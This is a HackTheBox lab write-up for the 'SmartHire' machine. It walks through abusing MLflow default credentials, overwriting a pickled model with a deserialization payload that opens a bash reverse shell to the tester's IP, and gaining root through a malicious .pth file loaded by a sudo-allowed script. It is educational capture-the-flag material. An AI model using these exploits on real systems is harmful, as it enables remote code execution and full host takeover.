---
title: HTB · SmartHire
slug: htb-smarthire
date: 2026-09-12
image: smarthire
platform: HackTheBox
os: Linux
difficulty: Medium
points: 845
tags: [hackthebox, linux, medium, active, mlflow, pickle, deserialization, python-pth]
description: SmartHire is a Linux machine on HackTheBox centered on an "AI hiring" web app that leans on **MLflow** for model storage.
featured: true
---

# Overview
SmartHire is a Linux machine on HackTheBox centered on an "AI hiring" web app that
leans on **MLflow** for model storage. MLflow is left on default credentials, and the
app blindly unpickles the model it stores there - so we poison a model artifact to get
a shell. From there, a `sudo`-allowed helper script imports Python plugins from a
group-writable directory, and a one-line `.pth` file hands us root.

The whole chain is short and reliable:

> MLflow default creds → overwrite a pickled model → RCE as `svcweb` → malicious `.pth` in a `devs`-writable plugin dir → root.
---
## Reconnaissance
Start with a full port scan, then service detection on what's open.
```bash
nmap -p- --min-rate 10000 -oN nmap-full.txt 10.129.245.215
nmap -sCV -p22,80 -oN nmap-sv.txt 10.129.245.215
```
Only two ports:
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
```
Port 80 redirects to `smarthire.htb`, so add it to `/etc/hosts`:
```bash
echo "10.129.245.215 smarthire.htb" | sudo tee -a /etc/hosts
```

The site is a Flask app for an "AI-first hiring platform." It talks a lot about
**MLflow** and a *model registry*, which is the first big hint. Since it's a name-based
vhost, fuzz for more virtual hosts:

```bash
ffuf -u http://10.129.245.215/ -H "Host: FUZZ.smarthire.htb" \
     -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 178
models                  [Status: 200, Size: 158, Words: 19, Lines: 1]
```

That gives us a second host - `models.smarthire.htb`. Add it to `/etc/hosts` too. It's
an **MLflow** server, and it wants authentication:

```bash
curl -s -H "Host: models.smarthire.htb" http://10.129.245.215/
# You are not authenticated. Please see .../auth/... on how to authenticate.
```

---

## Web Exploitation - Foothold
### The app side
Register an account (it asks for a *company* name), log in, and land on `/dashboard`.
The interesting endpoints are:
- `POST /upload_hiring_data` - upload a CSV; the app trains a model and **registers it in MLflow**.
- `POST /predict` - upload a resume CSV; the app **loads your model back from MLflow and runs it**.
- `GET  /model_info` - shows your model name, e.g. `acme-b5324e96ce6f-model`.
So the model name is derived from the company we chose (`acme`). Train once so a model
exists:
```bash
printf 'experience,skills\n60,"Python, Machine Learning, SQL"\n' > train.csv
curl -s -b cookies.txt -H "Host: smarthire.htb" \
     -F "file=@train.csv;type=text/csv" http://smarthire.htb/upload_hiring_data
```
### The MLflow side
MLflow has authentication enabled, but it's on the **default credentials** -
`admin:password`:
```bash
curl -s -u admin:password -H "Host: models.smarthire.htb" \
     "http://models.smarthire.htb/api/2.0/mlflow/registered-models/search"
```
That lists our model and, importantly, where its files live:
```json
"source": "mlflow-artifacts:/0/2b265d4471ef4bc486027ebec436f67b/artifacts/model"
```
Pull down the `MLmodel` file and we see how the model is stored:
```yaml
flavors:
  python_function:
    loader_module: mlflow.pyfunc.model
    python_model: python_model.pkl     # <-- a cloudpickle, loaded on /predict
mlflow_version: 2.14.1
```
The model is just a **pickle**. When we call `/predict`, the app calls
`mlflow.pyfunc.load_model(...)`, which unpickles `python_model.pkl`. Unpickling
arbitrary data is remote code execution - and because we're MLflow admin, we can simply
**overwrite that artifact** with our own malicious pickle.
### Poison the model → shell
A pickle runs whatever its `__reduce__` returns. Build one that spawns a reverse shell,
then `PUT` it over the existing artifact (the MLflow artifacts API happily overwrites):
```python
#!/usr/bin/env python3
# exploit.py - overwrite the MLflow model pickle with a reverse shell
import os, pickle, requests

ML = "http://models.smarthire.htb"
AUTH = ("admin", "password")
LHOST, LPORT = "10.10.15.26", 4444          # your tun0 IP + listener port

# find the model's run_id
run_id = requests.get(f"{ML}/api/2.0/mlflow/model-versions/search",
                       auth=AUTH).json()["model_versions"][0]["run_id"]

class Exploit:
    def __reduce__(self):
        return (os.system, (f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",))

payload = pickle.dumps(Exploit(), protocol=5)

r = requests.put(
    f"{ML}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/python_model.pkl",
    auth=AUTH, data=payload)
print("[*] artifact overwrite:", r.status_code)
```
Start a listener, run the script, then hit `/predict` to trigger the load:
```bash
nc -lvnp 4444          # in one terminal
python3 exploit.py     # overwrite the pickle

printf 'experience,skills\n60,"Python, SQL"\n' > resume.csv
curl -s -b cookies.txt -H "Host: smarthire.htb" \
     -F "file=@resume.csv;type=text/csv" http://smarthire.htb/predict
```
And we get a shell:
```
connect to [10.10.15.26] from smarthire [10.129.245.215]
svcweb@smarthire:/var/www/smarthire.htb$ id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```
`user.txt` is in `/home/svcweb/`. First flag done.

---

## Privilege Escalation

Two things stand out immediately. We're a member of the `devs` group, and `sudo -l`
shows a very specific rule:
```
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```
Look at that script:
```python
# /opt/tools/mlflow_ctl/mlflowctl.py
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))     # <-- the bug
```
`site.addsitedir()` doesn't just add a directory to `sys.path` - it also reads every
`.pth` file inside it, and **any `.pth` line starting with `import` gets executed**.
Now check the plugin directories:
```bash
ls -la /opt/tools/mlflow_ctl/plugins
# drwxrwxr-x 2 root devs 4096 ... dev      <-- writable by the 'devs' group
```
We can write to `plugins/dev`, and the sudo rule runs the script as **root**. So drop a
`.pth` file that runs a command, then invoke the allowed sudo command to fire it:
```bash
printf 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")\n' \
    > /opt/tools/mlflow_ctl/plugins/dev/pwn.pth

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```
The `.pth` executes as root and leaves us a SUID `bash`:
```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
# uid=1000(svcweb) ... euid=0(root) ...
```
